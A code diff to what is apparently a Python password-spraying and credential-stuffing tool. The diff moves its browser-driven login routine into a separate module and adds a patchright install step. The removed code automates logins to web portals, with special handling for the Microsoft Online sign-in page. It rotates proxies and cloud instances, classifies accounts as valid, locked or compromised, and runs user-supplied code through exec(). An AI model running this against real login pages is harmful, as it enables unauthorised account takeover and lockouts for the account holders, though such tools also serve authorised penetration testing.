@@ -15,7 +15,9 @@ import os
 import toml
 from seleniumbase import Driver
 import importlib.resources
-from . import azure_proxy, update
+from . import azure_proxy, update, attempt_login
+import subprocess
+from pathlib import Path
 
 
 class Colors:
@@ -351,7 +353,7 @@ def perform_spray(spray_config, credentials, proxy, queue):
         #   - USERNAME
         #   - PASSWORD
         #   - RESULT: one of ["INVALID USERNAME", "LOCKED", "PASSWORDLESS", "VALID USERNAME", "ERROR", "SUCCESS", "FAILURE"]
-        result = attempt_login(spray_config, proxy['url'])
+        result = attempt_login.main(spray_config, proxy['url'])
 
         results.append(result)
         spray_num_with_current_ip += 1
@@ -360,146 +362,6 @@ def perform_spray(spray_config, credentials, proxy, queue):
         aws.stop_ec2_instance(ec2, proxy['id'])
 
     queue.put(results)
-
-
-def attempt_login(spray_config, proxy_url):
-    # SeleniumBase with Undetected Chromedriver is a better solution, but doesn't work with multiprocessing out of the
-    #   box. Research needs to be done to properly support multiprocessing. For now, Undetected Chromedriver is used if
-    #   threads is set to 1.
-    if spray_config.threads == 1:
-        selenium_options = ['--ignore-certificate-errors', '--ignore-ssl-errors']
-        if proxy_url:
-            selenium_options.append(f'--proxy-server={proxy_url}')
-        # Initialize the Selenium browser
-        driver = Driver(uc=True,
-                        headless=spray_config.headless,
-                        chromium_arg=selenium_options)
-    else:
-        selenium_options = webdriver.ChromeOptions()
-        selenium_options.add_argument('--ignore-certificate-errors')
-        if spray_config.headless:
-            selenium_options.add_argument("--headless")
-        if proxy_url:
-            selenium_options.add_argument(f'--proxy-server={proxy_url}')
-        driver = webdriver.Chrome(options=selenium_options)
-
-    driver.set_page_load_timeout(15)
-    driver.delete_all_cookies()
-
-    for i in range(3):
-        try:
-            driver.get(spray_config.url)
-            break
-        except WebDriverException:
-            if i == 2:
-                print(
-                    f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - ERROR - Could not load the URL: {spray_config.url}")
-                driver.close()
-                return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
-
-    # Execute Before Code
-    if spray_config.pre_login_code:
-        exec(spray_config.pre_login_code)
-
-    # Wait until the username box loads
-    try:
-        WebDriverWait(driver, 5).until(
-            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")))
-    except:
-        print(f"ERROR - Could not find the username field with key {spray_config.username_field_key} and value "
-              f"{spray_config.username_field_value}")
-        driver.close()
-        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
-
-    # Find the username box
-    input_box = driver.find_element(By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")
-    input_box.clear()  # Clear any existing text in the input box
-    input_box.send_keys(spray_config.username)
-
-    # Try to find the password box. If it isn't on the current page, hit the ENTER key and wait for the Password
-    # field to load.
-    try:
-        WebDriverWait(driver, 1).until(
-            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
-    except TimeoutException:
-        input_box.send_keys(Keys.RETURN)
-        sleep(1)  # Wait for the page to load
-
-        # Specific to the Microsoft Online login portal
-        if "Microsoft" and "Work or school account" in driver.page_source:
-            work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
-            work_box.click()
-            sleep(1)
-
-    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.invalid_username):
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
-        driver.close()
-        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "INVALID USERNAME"}
-    elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.lockout):
-        driver.close()
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
-        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "LOCKED"}
-    elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.passwordless):
-        driver.close()
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - PASSWORDLESS: {spray_config.username}")
-        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "PASSWORDLESS"}
-    elif not spray_config.password:
-        driver.close()
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}VALID USERNAME{Colors.END}: {spray_config.username}")
-        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "VALID USERNAME"}
-
-    try:
-        WebDriverWait(driver, 3).until(
-            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
-    except:
-        print(f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value "
-              f"'{spray_config.password_field_value}'")
-        driver.close()
-        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
-
-    password_box = driver.find_element(By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")
-    password_box.clear()
-    password_box.send_keys(spray_config.password)
-    # If there's a checkbox, click it.
-    if spray_config.checkbox_key and spray_config.checkbox_value:
-        try:
-            checkbox = driver.find_element(By.XPATH, f"//input[@{spray_config.checkbox_key}='{spray_config.checkbox_value}']")
-            checkbox.click()
-        except:
-            print(f"ERROR - Could not find the password field with key {spray_config.password_field_key} and value "
-                  f"{spray_config.password_field_value}")
-
-    password_box.send_keys(Keys.RETURN)
-
-    # Check to see if the login was successful
-    sleep(2)
-    result = False
-    for conditional_statement in (spray_config.fail + spray_config.success):
-        if conditional_statement in driver.page_source:
-            result = True
-
-    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.lockout):
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
-        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "LOCKED"}
-
-    if result and spray_config.success:
-        result = "SUCCESS"
-    elif not result and spray_config.fail:
-        result = "SUCCESS"
-    elif result and spray_config.fail:
-        result = "INVALID"
-    elif not result and spray_config.success:
-        result = "INVALID"
-
-    driver.quit()
-
-    if result == "SUCCESS":
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {spray_config.username} - "
-              f"{spray_config.password}")
-    else:
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {spray_config.username} - {spray_config.password}")
-
-    return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': result}
 
 
 def credential_stuffing(spray_config, args, proxies):
@@ -566,3 +428,9 @@ def credential_stuffing(spray_config, args, proxies):
         stuffing_attempt += 1
 
     return results
+
+def initialize_playwright():
+    patchright_cmd = Path(sys.executable).parent / "patchright"
+
+    # Only needed for the first time run, but won't error on later runs
+    subprocess.run([patchright_cmd, "install"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
